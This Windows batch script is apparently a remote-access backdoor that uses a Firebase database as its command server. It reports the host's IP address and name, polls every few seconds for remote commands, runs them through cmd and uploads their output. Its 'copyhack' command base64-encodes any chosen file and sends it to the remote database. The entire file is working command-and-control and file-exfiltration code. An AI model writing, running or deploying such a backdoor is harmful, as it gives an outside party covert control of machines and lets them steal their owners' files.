@echo off
setlocal enabledelayedexpansion

:: Configuration
set FIREBASE_URL=
for /f "usebackq delims=" %%a in ("config.txt") do set "FIREBASE_URL=%%a"
set CLIENT_PATH=/clients/%COMPUTERNAME%
set COMMAND_PATH=/commands/%COMPUTERNAME%

:: Store the starting position (where the bat file is running from)
set "STARTING_POSITION=%CD%"

:: Initialize files
if exist output.txt del output.txt
if exist current_command.txt del current_command.txt
if exist cd_command.txt del cd_command.txt

:: Get IP Address
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do (
    for /f "tokens=* delims= " %%b in ("%%a") do set IP_ADDRESS=%%b
)

:: Send IP to Firebase
echo [%TIME%] Sending IP address to Firebase...
curl -X PATCH -d "{\"ip\":\"%IP_ADDRESS%\", \"last_online\":\"%DATE% %TIME%\"}" "%FIREBASE_URL%%CLIENT_PATH%.json"

:: Command processing loop
:loop
echo [%TIME%] Checking for commands...
curl -s "%FIREBASE_URL%%COMMAND_PATH%/command.json" > current_command.txt

set CURRENT_COMMAND=
for /f "usebackq delims=" %%a in ("current_command.txt") do set "CURRENT_COMMAND=%%a"

:: Remove surrounding quotes if present
set CURRENT_COMMAND=!CURRENT_COMMAND:"=!

if "!CURRENT_COMMAND!" neq "null" (
    if "!CURRENT_COMMAND!" neq "" (
        if "!CURRENT_COMMAND!" neq "{"error":"404 Not Found"}" (
            :: Get current directory BEFORE any command execution
            for /f "delims=" %%a in ('cd') do set "CURRENT_DIR_BEFORE=%%a"
            
            :: if cd_command.txt exists, and not empty, run all the commands in it
            if exist cd_command.txt (
                set "ALL_COMMANDS="
                for /f "usebackq delims=" %%c in ("cd_command.txt") do (
                    set "ALL_COMMANDS=!ALL_COMMANDS!%%c & "
                )
                if "!CURRENT_COMMAND:~0,3!"=="cd " (
                    set "ALL_COMMANDS=!ALL_COMMANDS!!CURRENT_COMMAND! & cd"
                ) else (
                    if "!CURRENT_COMMAND:~0,8!"=="copyhack" (
                        set "ALL_COMMANDS=cd"
                    ) else (
                        set "ALL_COMMANDS=!ALL_COMMANDS!!CURRENT_COMMAND!"
                    )
                )
                echo [%TIME%] Executing combined commands: !ALL_COMMANDS!
                cmd /c "!ALL_COMMANDS!" > output.txt 2>&1
                if /i "!CURRENT_COMMAND:~0,3!"=="cd " (
                    echo !CURRENT_COMMAND! >> cd_command.txt
                )
            ) else (
                echo [%TIME%] Executing: !CURRENT_COMMAND!
                if /i "!CURRENT_COMMAND:~0,3!"=="cd " (
                    echo !CURRENT_COMMAND! >> cd_command.txt
                    cmd /c "!CURRENT_COMMAND! & cd" > output.txt 2>&1
                ) else (
                    if "!CURRENT_COMMAND:~0,8!"=="copyhack" (
                        cmd /c "cd" > output.txt 2>&1
                    ) else (
                        cmd /c "!CURRENT_COMMAND!" > output.txt 2>&1
                    )
                )
            )
            
            :: Get current directory AFTER command execution
            for /f "delims=" %%a in ('cd') do set "CURRENT_DIR_AFTER=%%a"
            
            :: Additional processing for copyhack command
            if "!CURRENT_COMMAND:~0,8!"=="copyhack" (
                :: Extract filename from command
                set "FILENAME=!CURRENT_COMMAND:~9!"
                set "FILENAME=!FILENAME:"=!"
                
                :: Use the directory AFTER command execution (in case cd command changed it)
                set "CURRENT_DIR=!CURRENT_DIR_AFTER!"
                
                :: Construct full path
                set "FULL_PATH=!CURRENT_DIR!\!FILENAME!"
                
                echo [%TIME%] Processing copyhack for: !FULL_PATH!
                echo Current directory: !CURRENT_DIR!
                
                :: Check if file exists and process it
                if exist "!FULL_PATH!" (
                    :: Copy file to starting position first
                    echo [%TIME%] Copying file to starting position...
                    copy "!FULL_PATH!" "!STARTING_POSITION!\" >nul 2>&1
                    
                    :: Use PowerShell for proper base64 encoding from starting position
                    set "TEMP_FILE=!STARTING_POSITION!\!FILENAME!"
                    powershell -command "[convert]::ToBase64String([io.file]::ReadAllBytes('!TEMP_FILE!'))" > temp_base64.txt
                    
                    :: Read the clean base64 content
                    set /p BASE64_CONTENT=<temp_base64.txt
                    
                    :: Clean up temp files
                    del temp_base64.txt
                    del "!TEMP_FILE!"
                    
                    :: Send file to Firebase
                    echo [%TIME%] Sending file to Firebase...
                    curl -X PATCH -d "{\"file\":{\"name\":\"!FILENAME!\", \"content\":\"!BASE64_CONTENT!\", \"timestamp\":\"%DATE% %TIME%\"}}" "%FIREBASE_URL%%CLIENT_PATH%.json"
                    
                    :: Update output
                    echo File !FILENAME! successfully copied to Firebase >> output.txt
                    echo Source: !FULL_PATH! >> output.txt
                    echo File temporarily copied to: !TEMP_FILE! >> output.txt
                ) else (
                    echo File !FILENAME! not found in !CURRENT_DIR! >> output.txt
                    echo Searched at: !FULL_PATH! >> output.txt
                )
            )
            
            :: Process output for JSON
            set "JSON_OUTPUT="
            for /f "delims=" %%a in ('type output.txt') do (
                set "line=%%a"
                set "line=!line:\=\\!"
                set "line=!line:"=\"!"
                set "line=!line:/=\/!"
                set "JSON_OUTPUT=!JSON_OUTPUT!!line!\n"
            )
            
            :: Remove trailing newline
            if defined JSON_OUTPUT set "JSON_OUTPUT=!JSON_OUTPUT:~0,-2!"
            
            :: Send output to Firebase
            echo [%TIME%] Sending results to Firebase...
            curl -X PATCH -d "{\"output\":\"!JSON_OUTPUT!\", \"status\":\"completed\", \"timestamp\":\"%DATE% %TIME%\"}" "%FIREBASE_URL%%COMMAND_PATH%.json"
            
            :: Clear the command
            echo [%TIME%] Clearing command...
            curl -X PATCH -d "{\"command\":null}" "%FIREBASE_URL%%COMMAND_PATH%.json"
            
            :: Clear temporary variables
            set "CURRENT_DIR_BEFORE="
            set "CURRENT_DIR_AFTER="
            set "CURRENT_DIR="
        )
    )
)

timeout /t 5 /nobreak >nul
goto loop